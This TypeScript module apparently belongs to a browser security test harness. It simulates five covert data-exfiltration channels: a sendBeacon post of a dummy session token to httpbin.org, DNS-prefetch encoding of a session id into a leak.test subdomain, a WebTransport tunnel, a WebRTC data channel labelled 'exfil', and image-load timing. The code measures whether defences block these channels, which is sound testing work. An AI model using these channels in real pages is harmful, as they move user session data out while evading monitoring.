import type { AttackResult, AttackTest } from "../types.js";

async function simulateBeaconAPIBypass(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    if (!navigator.sendBeacon) {
      return {
        blocked: true,
        executionTime: performance.now() - startTime,
        details: "Beacon API not available",
      };
    }

    const exfilData = JSON.stringify({
      type: "beacon_exfil",
      sessionToken: "abc123xyz789",
      userId: "user@example.com",
      sensitiveInfo: Array(1000)
        .fill("PII_")
        .join(""),
    });

    // sendBeacon は通常のブラウザ監視とは異なる
    // ページ離脱後でも送信され、応答を待たない
    const success = navigator.sendBeacon(
      "https://httpbin.org/post",
      exfilData
    );

    const executionTime = performance.now() - startTime;

    if (success) {
      return {
        blocked: false,
        executionTime,
        details: `Beacon API exfiltration successful - queued after page unload (detection bypass)`,
      };
    } else {
      return {
        blocked: true,
        executionTime,
        details: "Beacon API call failed or blocked",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Beacon API blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateDNSPrefetchLeak(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // DNS prefetch による隠蔽通信チャネル
    // リンク作成と削除のタイミングから情報を推測

    const leakData = "leaked_session_id_12345";
    const encodedDomain = Array.from(leakData)
      .map((char) => char.charCodeAt(0).toString(16))
      .join("");

    // 複数のDNS prefetch を実行
    const link = document.createElement("link");
    link.rel = "dns-prefetch";
    link.href = `https://${encodedDomain}.leak.test/`;

    const measureStart = performance.now();
    document.head.appendChild(link);

    // DNS解決のタイミングを測定
    await new Promise((resolve) => setTimeout(resolve, 100));

    const timingMeasured = performance.now() - measureStart;

    document.head.removeChild(link);

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      executionTime,
      details: `DNS prefetch leak successful - timing-based covert channel established (${timingMeasured}ms)`,
    };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `DNS prefetch leak blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateWebTransportAttempt(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    type WebTransportType = {
      new (url: string): { ready: Promise<void> };
    };

    const WebTransport = (globalThis as unknown as Record<string, unknown>).WebTransport as
      | WebTransportType
      | undefined;

    if (!WebTransport) {
      return {
        blocked: true,
        executionTime: performance.now() - startTime,
        details: "WebTransport API not available (not yet widely supported)",
      };
    }

    // WebTransport は HTTPS + UDP を使用
    // fetch/WebSocket とは異なる通信チャネル
    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        resolve({
          blocked: false,
          executionTime: performance.now() - startTime,
          details:
            "WebTransport connection attempt timeout (server unavailable)",
        });
      }, 2000);

      try {
        const transport = new WebTransport(
          "https://webtransport-test.example.com"
        );

        transport
          .ready
          .then(() => {
            clearTimeout(timeout);
            resolve({
              blocked: false,
              executionTime: performance.now() - startTime,
              details:
                "WebTransport connection successful - low-latency UDP tunnel established",
            });
          })
          .catch((error: Error) => {
            clearTimeout(timeout);
            resolve({
              blocked: true,
              executionTime: performance.now() - startTime,
              details: `WebTransport blocked: ${error.message}`,
            });
          });
      } catch (error) {
        clearTimeout(timeout);
        const errorMessage = error instanceof Error ? error.message : String(error);
        resolve({
          blocked: true,
          executionTime: performance.now() - startTime,
          details: `WebTransport initialization failed: ${errorMessage}`,
        });
      }
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `WebTransport attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateWebRTCDataChannel(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const PeerConnectionCtor: typeof RTCPeerConnection | undefined =
      (window as unknown as Record<string, unknown>).RTCPeerConnection as typeof RTCPeerConnection | undefined ||
      (window as unknown as Record<string, unknown>).webkitRTCPeerConnection as typeof RTCPeerConnection | undefined ||
      (window as unknown as Record<string, unknown>).mozRTCPeerConnection as typeof RTCPeerConnection | undefined;

    if (!PeerConnectionCtor) {
      return {
        blocked: true,
        executionTime: performance.now() - startTime,
        details: "WebRTC API not available",
      };
    }

    const peerConnection = new PeerConnectionCtor({
      iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }],
    });

    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        peerConnection.close();
        resolve({
          blocked: false,
          executionTime: performance.now() - startTime,
          details: "WebRTC DataChannel attempt timed out (no peer)",
        });
      }, 3000);

      const dataChannel = peerConnection.createDataChannel("exfil", {
        ordered: false,
      });

      dataChannel.onopen = () => {
        clearTimeout(timeout);

        dataChannel.send(
          JSON.stringify({
            type: "webrtc_exfil",
            data: "stolen_session_data",
            timestamp: Date.now(),
          })
        );

        peerConnection.close();

        resolve({
          blocked: false,
          executionTime: performance.now() - startTime,
          details: `WebRTC DataChannel established - peer-to-peer exfiltration possible`,
        });
      };

      dataChannel.onerror = (error: RTCErrorEvent) => {
        clearTimeout(timeout);
        peerConnection.close();

        resolve({
          blocked: true,
          executionTime: performance.now() - startTime,
          details: `WebRTC DataChannel error: ${error.error?.message ?? "Unknown error"}`,
        });
      };

      peerConnection.addEventListener("connectionstatechange", () => {
        if (peerConnection.connectionState === "failed") {
          clearTimeout(timeout);
          peerConnection.close();

          resolve({
            blocked: true,
            executionTime: performance.now() - startTime,
            details: "WebRTC connection failed",
          });
        }
      });

      // ICE candidates collection
      peerConnection.onicecandidate = (event: RTCPeerConnectionIceEvent) => {
        if (!event.candidate) {
          // ICE gathering complete
        }
      };
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `WebRTC DataChannel blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateImageLoadCovertChannel(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // 画像ロードのタイミングを使用した隠蔽通信
    // キャッシュ/未キャッシュの区別により情報推測可能

    const timings: number[] = [];

    for (let i = 0; i < 5; i++) {
      const img = document.createElement("img");
      const loadStart = performance.now();

      await new Promise<void>((resolve) => {
        img.onload = () => {
          timings.push(performance.now() - loadStart);
          resolve();
        };

        img.onerror = () => {
          timings.push(performance.now() - loadStart);
          resolve();
        };

        img.src = `https://httpbin.org/image/png?cache_bust=${i}_${Date.now()}`;

        // Timeout after 1 second
        setTimeout(() => {
          timings.push(performance.now() - loadStart);
          resolve();
        }, 1000);
      });
    }

    const executionTime = performance.now() - startTime;
    const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;

    return {
      blocked: false,
      executionTime,
      details: `Image load timing covert channel established - avg ${avgTiming.toFixed(0)}ms (cache analysis possible)`,
    };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Image load timing channel blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

export const covertAttacks: AttackTest[] = [
  {
    id: "covert-beacon-api",
    name: "Beacon API Data Exfiltration",
    category: "covert",
    description:
      "Uses Navigator.sendBeacon() for background data exfiltration (queued after page unload)",
    severity: "critical",
    simulate: simulateBeaconAPIBypass,
  },
  {
    id: "covert-dns-prefetch-leak",
    name: "DNS Prefetch Covert Channel",
    category: "covert",
    description:
      "Establishes timing-based covert communication via DNS prefetch requests",
    severity: "high",
    simulate: simulateDNSPrefetchLeak,
  },
  {
    id: "covert-webtransport",
    name: "WebTransport Tunnel",
    category: "covert",
    description:
      "Establishes UDP-based low-latency tunnel via WebTransport API (bypasses TCP monitoring)",
    severity: "critical",
    simulate: simulateWebTransportAttempt,
  },
  {
    id: "covert-webrtc-datachannel",
    name: "WebRTC DataChannel P2P",
    category: "covert",
    description:
      "Creates peer-to-peer communication channel via WebRTC DataChannel (difficult to monitor)",
    severity: "critical",
    simulate: simulateWebRTCDataChannel,
  },
  {
    id: "covert-image-load-timing",
    name: "Image Load Timing Covert Channel",
    category: "covert",
    description:
      "Uses HTTP image load timing patterns for side-channel information leakage",
    severity: "medium",
    simulate: simulateImageLoadCovertChannel,
  },
];
